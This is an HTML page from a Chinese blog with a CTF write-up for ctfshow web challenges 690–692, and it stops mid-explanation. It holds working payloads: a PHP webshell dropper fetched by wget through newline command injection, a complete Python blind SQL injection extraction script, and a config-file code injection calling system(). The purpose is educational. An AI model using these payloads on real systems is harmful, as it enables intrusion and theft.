@@ -1,0 +1,315 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>【CTFSHOW】 web入门大赛原题一（WEB690-） | 西风的那一年</title><meta name="author" content="ZEPHeyrr"><meta name="copyright" content="ZEPHeyrr"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="WEB-690（暂无）题面：12345678910&lt;?php highlight_file(__FILE__);error_reporting(0);$args &#x3D; $_GET[&#x27;args&#x27;];for ( $i&#x3D;0; $i&lt;count($args); $i++ )&#123;    if ( !preg_match(&#x27;&#x2F;^\w+$&#x2F;&#x27;, $arg">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【CTFSHOW】 web入门大赛原题一（WEB690-）">
+<meta property="og:url" content="http://120.46.180.209/2026/11/15/dasaiyuanti3/index.html">
+<meta property="og:site_name" content="西风的那一年">
+<meta property="og:description" content="WEB-690（暂无）题面：12345678910&lt;?php highlight_file(__FILE__);error_reporting(0);$args &#x3D; $_GET[&#x27;args&#x27;];for ( $i&#x3D;0; $i&lt;count($args); $i++ )&#123;    if ( !preg_match(&#x27;&#x2F;^\w+$&#x2F;&#x27;, $arg">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://120.46.180.209/img/ctf.png">
+<meta property="article:published_time" content="2026-11-15T10:40:44.000Z">
+<meta property="article:modified_time" content="2026-11-15T08:09:08.000Z">
+<meta property="article:author" content="ZEPHeyrr">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="ctfshow大赛原题">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://120.46.180.209/img/ctf.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "【CTFSHOW】 web入门大赛原题一（WEB690-）",
+  "url": "http://120.46.180.209/2026/11/15/dasaiyuanti3/",
+  "image": "http://120.46.180.209/img/ctf.png",
+  "datePublished": "2026-11-15T10:40:44.000Z",
+  "dateModified": "2026-11-15T08:09:08.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "ZEPHeyrr",
+      "url": "http://120.46.180.209/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="http://120.46.180.209/2026/11/15/dasaiyuanti3/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '【CTFSHOW】 web入门大赛原题一（WEB690-）',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/StaticFile_HEXO@latest/butterfly/css/macblack.css"><link rel="stylesheet" href="/css/mouse.css"><link rel="stylesheet" href="/css/trans.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/favicon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">69</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/Message/"><i class="fa-fw fa fa-envelope-open"></i><span> 留言</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/ctf.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">西风的那一年</span></a><a class="nav-page-title" href="/"><span class="site-name">【CTFSHOW】 web入门大赛原题一（WEB690-）</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/Message/"><i class="fa-fw fa fa-envelope-open"></i><span> 留言</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">【CTFSHOW】 web入门大赛原题一（WEB690-）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-11-15T10:40:44.000Z" title="发表于 2026-11-15 18:40:44">2026-11-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-11-15T08:09:08.000Z" title="更新于 2026-11-15 16:09:08">2026-11-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%8D%9A%E6%96%87/">博文</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="WEB-690（暂无）"><a href="#WEB-690（暂无）" class="headerlink" title="WEB-690（暂无）"></a>WEB-690（暂无）</h1><h2 id="题面："><a href="#题面：" class="headerlink" title="题面："></a>题面：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$args</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;args&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$args</span>); <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\w+$/&#x27;</span>, <span class="variable">$args</span>[<span class="variable">$i</span>]) ) <span class="comment">//传入的参数里只能由数字字母和下划线</span></span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;sorry&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&#x27;./ &#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&quot; &quot;</span>, <span class="variable">$args</span>));<span class="comment">//PCRE 的 $ 允许匹配&quot;结尾换行&quot;，所以 &quot;a\n&quot; 能通过 /^\w+$/，而换行在 shell 里等价于 ;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>这里留一个官方WP，但打法思路要用公网服务器，但我的服务器过期了，所以这题先跳过</p>
+<p>在服务器80端口开一个服务，放一个一句话木马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?args[]=1%0a&amp;args[]=mkdir&amp;args[]=a%0a&amp;args[]=cd&amp;args[]=a%0a&amp;args[]=wget&amp;args[]=&lt;你的十进制IP&gt;</span><br><span class="line">?args[]=1%0a&amp;args[]=tar&amp;args[]=cvf&amp;args[]=shell&amp;args[]=a</span><br><span class="line">?args[]=1%0a&amp;args[]=php&amp;args[]=shell</span><br></pre></td></tr></table></figure>
+
+<p>第 2 步把 <code>a/index.html</code>（含 <code>&lt;?php</code>）打成 tar；第 3 步 <code>php</code> 执行 tar 时，词法器在二进制里命中 <code>&lt;?php</code> 段并执行，落地 <code>shell.php</code>。</p>
+<p>访问 <code>/a/shell.php</code>，<code>1=var_dump(getenv(&quot;FLAG&quot;));</code>（这题flag在环境变量里）</p>
+<hr>
+<p>也有其他解题思路，总归需要找一个”能带出环境变量”的文件落地，把字节写在文件里在执行</p>
+<h1 id="WEB-691"><a href="#WEB-691" class="headerlink" title="WEB-691"></a>WEB-691</h1><h2 id="题面：-1"><a href="#题面：-1" class="headerlink" title="题面："></a>题面：</h2><p><img src="/2026/11/15/dasaiyuanti3/QQ20261115-154439.png"></p>
+<p>堵死了常规注入，过滤了一堆关键词，包含括号、等号（&#x3D;），查询失败时不报错，只剩下一种语义： <code>ORDER BY</code> + <code>echo $row[&#39;username&#39;]</code></p>
+<h2 id="解析："><a href="#解析：" class="headerlink" title="解析："></a>解析：</h2><p>注入 <code>username</code> 位置，把猜测串塞进 UNION 的第 3 列（password 列），让 MySQL 帮我们<strong>比较</strong>：</p>
+<p>代码块</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or 1 union select 1,&#x27;</span><span class="number">0</span><span class="string">&#x27;,binary &#x27;</span><span class="operator">&lt;</span>GUESS<span class="operator">&gt;</span><span class="string">&#x27; order by 3, 2#</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>&#39;or 1</code>：把 admin 真实行并进结果集（否则只剩我们一行，无从比较）</li>
+<li><code>union select 1,&#39;0&#39;,&lt;GUESS&gt;</code>：第 1 列给真值过 <code>if($row[&#39;id&#39;])</code>，第 2 列是<strong>信标</strong>（会被 <code>echo</code>），第 3 列是猜测</li>
+<li><code>order by 3, 2</code>：先按密码升序，平局再按信标列</li>
+</ul>
+<p>实际执行：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;A&#x27;</span>,<span class="type">binary</span> <span class="string">&#x27;&lt;GUESS&gt;&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>, <span class="number">2</span> #<span class="string">&#x27; and password=&#x27;</span>x<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>设已知前缀 P。谓词 pred(c) &#x3D; (P+chr(c) &lt;&#x3D; flag) 在字节序下对 c 单调:</p>
+<p>  c &lt;  F[i]  -&gt; 小于</p>
+<p>  c &#x3D;&#x3D; F[i]  -&gt; 小于(真前缀) 或 相等(回收尾那一位)</p>
+<p>  c &gt;  F[i]  -&gt; 大于</p>
+<p>&#x3D;&gt; 满足 pred 的最大 c 就是 F[i], 每位 log2(95)≈7 次 cmp, 每次 cmp&#x3D;2 个请求。猜测串本身就是注入内容, 也会被 filter 检查。flag 一般不含表里的词, 但为稳:</p>
+<p>一旦命中过滤词, 改用 <code>binary 0x&lt;hex&gt;</code>, hex 只含 0-9a-f, 不可能命中任何一个词。</p>
+<p>于是 <code>echo</code> 成了比较器：</p>
+<table>
+<thead>
+<tr>
+<th>关系</th>
+<th>回显</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>猜测 &lt; flag</td>
+<td>信标 <code>0</code></td>
+</tr>
+<tr>
+<td>猜测 &gt; flag</td>
+<td><code>admin</code></td>
+</tr>
+<tr>
+<td>猜测 &#x3D;&#x3D; flag</td>
+<td>由第 2 列决定 → 升序 <code>0</code> &#x2F; <code>desc</code> <code>admin</code></td>
+</tr>
+</tbody></table>
+<p><strong>payload</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, time, urllib3, requests</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://xxx.challenge.ctf.show/&quot;</span></span><br><span class="line">MARKER = <span class="string">&quot;0&quot;</span>        <span class="comment"># 信标: 必须小于 admin(按第2列升序时我们行在前)</span></span><br><span class="line">BLOCKED = [<span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;username&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="string">&quot;where&quot;</span>, <span class="string">&quot;case&quot;</span>, <span class="string">&quot;when&quot;</span>,</span><br><span class="line">           <span class="string">&quot;like&quot;</span>, <span class="string">&quot;regexp&quot;</span>, <span class="string">&quot;into&quot;</span>, <span class="string">&quot;limit&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;;&quot;</span>]</span><br><span class="line">LO, HI = <span class="number">32</span>, <span class="number">126</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lit</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;把猜测串写成二进制字面量; 命中过滤词时用 0x hex(天然 binary)。&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(b <span class="keyword">in</span> s.lower() <span class="keyword">for</span> b <span class="keyword">in</span> BLOCKED):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;binary 0x&quot;</span> + s.encode().<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;binary &#x27;&quot;</span> + s.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\\&#x27;&quot;</span>) + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_post</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(URL, timeout=<span class="number">15</span>, verify=<span class="literal">False</span>,</span><br><span class="line">                              data=&#123;<span class="string">&quot;username&quot;</span>: payload, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;x&quot;</span>&#125;)</span><br><span class="line">            body = r.text</span><br><span class="line">            i = body.rfind(<span class="string">&quot;&lt;/code&gt;&quot;</span>)        <span class="comment"># 页面高亮的源码里也有 admin, 只看回显</span></span><br><span class="line">            tail = body[i + <span class="number">7</span>:].strip() <span class="keyword">if</span> i &gt;= <span class="number">0</span> <span class="keyword">else</span> body.strip()</span><br><span class="line">            <span class="keyword">if</span> tail:</span><br><span class="line">                <span class="keyword">return</span> tail</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;illegal&quot;</span> <span class="keyword">in</span> body:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;filtered: &quot;</span> + payload)</span><br><span class="line">        <span class="keyword">except</span> RuntimeError:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    [retry] %s&quot;</span> % e, file=sys.stderr)</span><br><span class="line">            time.sleep(<span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;no response&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp_flag</span>(<span class="params">guess: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;-1: guess&lt;flag  0: guess==flag  1: guess&gt;flag  (逐字节比较)&quot;&quot;&quot;</span></span><br><span class="line">    g = lit(guess)</span><br><span class="line">    asc = _post(<span class="string">&quot;&#x27;or 1 union select 1,&#x27;&#123;m&#125;&#x27;,&#123;g&#125; order by 3, 2#&quot;</span>.<span class="built_in">format</span>(m=MARKER, g=g))</span><br><span class="line">    dsc = _post(<span class="string">&quot;&#x27;or 1 union select 1,&#x27;&#123;m&#125;&#x27;,&#123;g&#125; order by 3, 2 desc#&quot;</span>.<span class="built_in">format</span>(m=MARKER, g=g))</span><br><span class="line">    a, d = asc.startswith(MARKER), dsc.startswith(MARKER)</span><br><span class="line">    <span class="keyword">if</span> a <span class="keyword">and</span> d:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> a <span class="keyword">and</span> <span class="keyword">not</span> d:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract</span>():</span><br><span class="line">    <span class="comment"># 冒烟: 用已知平局验证三态判定逻辑(V1/V2)</span></span><br><span class="line">    <span class="keyword">assert</span> cmp_flag(<span class="string">&quot;a&quot;</span>) == -<span class="number">1</span>, <span class="string">&quot;sanity: &#x27;a&#x27; 应小于 flag&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> cmp_flag(<span class="string">&quot;z&quot;</span> * <span class="number">8</span>) == <span class="number">1</span>, <span class="string">&quot;sanity: &#x27;zzzzzzzz&#x27; 应大于 flag&quot;</span></span><br><span class="line"></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        lo, hi = LO, HI</span><br><span class="line">        <span class="keyword">while</span> lo &lt; hi:                     <span class="comment"># 最大满足 (P+chr(c) &lt;= flag) 的 c</span></span><br><span class="line">            mid = (lo + hi + <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> cmp_flag(flag + <span class="built_in">chr</span>(mid)) &lt;= <span class="number">0</span>:</span><br><span class="line">                lo = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                hi = mid - <span class="number">1</span></span><br><span class="line">        flag += <span class="built_in">chr</span>(lo)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] %-3d %s&quot;</span> % (<span class="built_in">len</span>(flag), flag))</span><br><span class="line">        <span class="keyword">if</span> cmp_flag(flag) == <span class="number">0</span>:            <span class="comment"># 三态判定: 整串相等 =&gt; 结束</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(flag) &gt; <span class="number">100</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    f = extract()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[FLAG] &quot;</span> + f)</span><br></pre></td></tr></table></figure>
+
+<h1 id="WEB-692"><a href="#WEB-692" class="headerlink" title="WEB-692"></a>WEB-692</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>])) <span class="keyword">die</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;</span>, <span class="string">&quot;\$option=&#x27;<span class="subst">$str</span>&#x27;;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>, <span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="解析-1"><a href="#解析-1" class="headerlink" title="解析"></a>解析</h2><ol>
+<li><code>config.php</code> 内容形如 <code>&lt;?php $option=&#39;...&#39;; ?&gt;</code>，<strong>可直接访问 <code>/config.php</code> 并被 PHP 执行</strong>；</li>
+<li>每次请求都会把 <code>config.php</code> 里匹配到的 <code>$option=&#39;...&#39;;</code> 整段替换成 <code>$option=&#39;&lt;addslashes(option)&gt;&#39;;</code> 再写回；</li>
+<li>只要让写回的结果<strong>跳出单引号串</strong>，请求 <code>/config.php</code> 就是任意代码执行。</li>
+</ol>
+<p> <code>preg_replace</code> 替换串的转义把 <code>addslashes</code> 抵消</p>
+<p><code>addslashes</code> 本身是可靠的（<code>&#39;</code> → <code>\&#39;</code>）。但替换串 <code>&quot;\$option=&#39;$str&#39;;&quot;</code> 还要经过 <strong><code>preg_replace</code> 的替换串解析</strong>，而它会把成对的 <code>\\</code> 折叠成单个 <code>\</code>。</p>
+<p>设输入在引号前放 <code>k</code> 个反斜杠：</p>
+<table>
+<thead>
+<tr>
+<th>k</th>
+<th><code>addslashes</code> 后引号前</th>
+<th><code>preg_replace</code> 处理后的文件里</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td><code>\&#39;</code></td>
+<td><code>\&#39;</code></td>
+<td>引号被转义，安全</td>
+</tr>
+<tr>
+<td><strong>1</strong></td>
+<td><code>\\\&#39;</code>(3个)</td>
+<td><strong><code>\\&#39;</code></strong></td>
+<td>先转义反斜杠 → <strong>引号裸奔</strong> → 闭合字符串</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>\\\\\&#39;</code>(5个)</td>
+<td><code>\\\&#39;</code></td>
+<td>又安全</td>
+</tr>
+</tbody></table>
+<p>所以 <strong>k&#x3D;1</strong> 就能逃逸。替换串尾部还固定带一个 <code>&#39;;</code>，用 <code>//</code> 注释掉即可。</p>
+<p>如果写入：<code>/?option=&#39;;system($_GET[0]);//</code></p>
+<p>写入config.php后就变成了：</p>
